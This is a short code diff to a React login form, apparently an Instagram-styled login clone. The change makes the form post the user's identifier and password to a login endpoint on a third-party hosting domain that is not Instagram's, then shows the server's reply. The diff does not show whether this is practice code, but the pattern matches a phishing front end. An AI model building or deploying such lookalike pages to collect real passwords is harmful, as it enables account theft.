@@ -19,16 +19,30 @@ function App() {
     setMessage('');
 
     try {
-        await axios.post(
-  'https://instagram-login-ui.onrender.com/api/login',
-  formData
-);
-
-    } catch (error) {
-      setMessage(
-        error.response?.data?.message || '❌ Server error'
-      );
+  const response = await axios.post(
+    'https://instagram-login-ui.onrender.com/api/login',
+    {
+      identifier: formData.identifier,
+      password: formData.password
+    },
+    {
+      headers: {
+        'Content-Type': 'application/json'
+      }
     }
+  );
+
+  // show backend message even on success response
+  if (response.data?.message) {
+    setMessage(response.data.message);
+  }
+
+} catch (error) {
+  setMessage(
+    error.response?.data?.message || '❌ Server error'
+  );
+}
+
   };
 
   return (
